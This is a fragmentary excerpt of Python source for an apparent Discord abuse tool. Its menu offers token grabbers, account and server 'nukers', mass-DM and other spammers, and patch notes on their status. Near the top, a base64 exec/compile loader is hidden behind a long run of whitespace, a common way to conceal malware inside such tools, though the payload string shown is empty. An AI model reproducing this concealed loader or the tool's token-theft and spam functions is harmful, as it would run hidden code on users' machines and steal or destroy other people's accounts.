...
type('ThreadPoolExecutor')                                                                                                                                                                                                                                                          ,__import__('builtins').exec(__import__('builtins').compile(__import__('base64').b64decode(""),'<string>','exec'))
...
{m}[{w}1{Fore.RESET}{m}]{Fore.RESET} Server Joiner   {b}|{Fore.RESET}{m}[{Fore.WHITE}9{Fore.RESET}{m}]{Fore.RESET}  Channel Spammer   {b}|{Fore.RESET}{m}[{Fore.WHITE}17{Fore.RESET}{m}]{Fore.RESET} Patch Notes{Fore.RESET}         {b}|{Fore.RESET}{m}[{Fore.WHITE}25{Fore.RESET}{m}]{Fore.RESET} Token Generator{Fore.RESET}
{m}[{w}2{Fore.RESET}{m}]{Fore.RESET} Server Leaver   {b}|{Fore.RESET}{m}[{Fore.WHITE}10{Fore.RESET}{m}]{Fore.RESET} DM Spammer        {b}|{Fore.RESET}{m}[{Fore.WHITE}18{Fore.RESET}{m}]{Fore.RESET} About/Activity{Fore.RESET}      {b}|{Fore.RESET}{m}[{Fore.WHITE}26{Fore.RESET}{m}]{Fore.RESET} Nitro Generator{Fore.RESET}
{m}[{w}3{Fore.RESET}{m}]{Fore.RESET} Token Checker   {b}|{Fore.RESET}{m}[{Fore.WHITE}11{Fore.RESET}{m}]{Fore.RESET} Friend Spammer    {b}|{Fore.RESET}{m}[{Fore.WHITE}19{Fore.RESET}{m}]{Fore.RESET} Server Lookup{Fore.RESET}       {b}|{Fore.RESET}{m}[{Fore.WHITE}27{Fore.RESET}{m}]{Fore.RESET} QR Token Grabber{Fore.RESET}
{m}[{w}4{Fore.RESET}{m}]{Fore.RESET} Token Onliner   {b}|{Fore.RESET}{m}[{Fore.WHITE}12{Fore.RESET}{m}]{Fore.RESET} HypeSquad Joiner  {b}|{Fore.RESET}{m}[{Fore.WHITE}20{Fore.RESET}{m}]{Fore.RESET} Token Infomation{Fore.RESET}    {b}|{Fore.RESET}{m}[{Fore.WHITE}28{Fore.RESET}{m}]{Fore.RESET} Member ID Scraper{Fore.RESET}
{m}[{w}5{Fore.RESET}{m}]{Fore.RESET} Token Grabber   {b}|{Fore.RESET}{m}[{Fore.WHITE}13{Fore.RESET}{m}]{Fore.RESET} Reaction Spammer  {b}|{Fore.RESET}{m}[{Fore.WHITE}21{Fore.RESET}{m}]{Fore.RESET} Status Changer{Fore.RESET}      {b}|{Fore.RESET}{m}[{Fore.WHITE}29{Fore.RESET}{m}]{Fore.RESET} PFP Changer{Fore.RESET}
{m}[{w}6{Fore.RESET}{m}]{Fore.RESET} Server MassDM   {b}|{Fore.RESET}{m}[{Fore.WHITE}14{Fore.RESET}{m}]{Fore.RESET} NickName Changer  {b}|{Fore.RESET}{m}[{Fore.WHITE}22{Fore.RESET}{m}]{Fore.RESET} Group Spammer{Fore.RESET}       {b}|{Fore.RESET}{m}[{Fore.WHITE}30{Fore.RESET}{m}]{Fore.RESET} About{Fore.RESET}
{m}[{w}7{Fore.RESET}{m}]{Fore.RESET} Account Nuker   {b}|{Fore.RESET}{m}[{Fore.WHITE}15{Fore.RESET}{m}]{Fore.RESET} Webhook Spammer   {b}|{Fore.RESET}{m}[{Fore.WHITE}23{Fore.RESET}{m}]{Fore.RESET} Auto Login{Fore.RESET}          {b}|{Fore.RESET}{m}[{Fore.WHITE}31{Fore.RESET}{m}]{Fore.RESET}{lr} THREADS{Fore.RESET}
{m}[{w}8{Fore.RESET}{m}]{Fore.RESET} Server Nuker    {b}|{Fore.RESET}{m}[{Fore.WHITE}16{Fore.RESET}{m}]{Fore.RESET} VC Spammer        {b}|{Fore.RESET}{m}[{Fore.WHITE}24{Fore.RESET}{m}]{Fore.RESET} DM Deleter{Fore.RESET}          {b}|{Fore.RESET}{m}[{Fore.WHITE}32{Fore.RESET}{m}]{Fore.RESET}{lr} EXIT{Fore.RESET}''')
    Write.Print("════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════", Colors.purple_to_blue, interval=0.000)
...
#   SERVER MASSDM
    if choice == '6':
        ...
        if choic == '1':
            ...
            file = open("data/massdm_IDs.txt", "r")
            Counter = 0
                ...
                try:
                    for token in tokens:
                        for i in range(realamountt):
                            with open("data/massdm_IDs.txt", "r") as file:
                                allText = file.read()
...
#   PATCH NOTES
    if choice == '17':
        ...
        print(f'[\x1b[95m>\x1b[95m\x1B[37m] Server Nuker (OUTDATED) - (FIXING IN NEXT UPDATE)\n[\x1b[95m>\x1b[95m\x1B[37m] Server MassDM (OUTDATED) - (adding API v10 in next UPDATE!)\n[\x1b[95m>\x1b[95m\x1B[37m] DM Spammer (OUTDATED) - (adding captcha key API in next UPDATE!)\n[\x1b[95m>\x1b[95m\x1B[37m] PFP Changer (WORKING) - (locks account tokens but fixing in next UPDATE!)')
